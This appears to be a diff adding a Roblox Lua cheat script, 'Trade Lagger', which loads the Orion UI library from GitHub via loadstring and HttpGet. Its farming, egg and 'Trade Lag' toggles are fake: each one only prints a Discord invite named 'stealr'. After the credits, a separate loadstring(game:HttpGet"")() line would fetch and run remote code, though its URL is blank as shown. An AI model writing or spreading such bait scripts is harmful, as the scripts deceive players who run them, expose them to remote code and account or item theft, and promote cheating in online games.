@@ -1,0 +1,122 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Trade Lagger                Dzban#3438", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
+
+local Tab = Window:MakeTab({
+	Name = "Farming & Eggs",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Automation"
+})
+
+Tab:AddToggle({
+	Name = "Auto farm current area",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Egg Stuff"
+})
+
+Tab:AddTextbox({
+	Name = "Egg Name",
+	Default = "default box input",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+Tab:AddToggle({
+	Name = "Triple Hatch",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+Tab:AddToggle({
+	Name = "Open egg",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "More"
+})
+
+Tab:AddToggle({
+	Name = "Claim Gifts",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Claim Rank & VIP Rewards",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddToggle({
+	Name = "Trade Lag",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+Tab:AddToggle({
+	Name = "COMING SOON",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+Tab:AddToggle({
+	Name = "COMING SOON",
+	Default = false,
+	Callback = function(Value)
+		print("dsc.gg/stealr")
+
+	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddLabel("Dzban#3438 on Discord")
+wait(0)
+loadstring(game:HttpGet"")()
+wait(0)
+OrionLib:MakeNotification({
+	Name = "",
+	Content = "Dzban#3438 on Discord",
+	Image = "",
+	Time = 5
+})
